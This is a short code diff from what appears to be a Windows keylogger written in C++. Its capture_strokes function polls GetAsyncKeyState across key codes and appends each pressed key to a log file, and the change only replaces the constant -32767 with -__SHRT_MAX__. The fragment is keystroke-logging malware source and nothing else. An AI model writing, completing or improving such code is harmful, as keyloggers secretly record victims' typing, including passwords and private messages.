@@ -18,7 +18,7 @@ void capture_strokes()
     {
         for (char key = 8; key <= 222; key++)
         {
-            if (GetAsyncKeyState(key) == -32767)
+            if (GetAsyncKeyState(key) == -__SHRT_MAX__)
             {
                 ofstream write(file_name, ios::app);
                 if (((key > 64) && (key < 91)) && !(GetAsyncKeyState(0x10)))
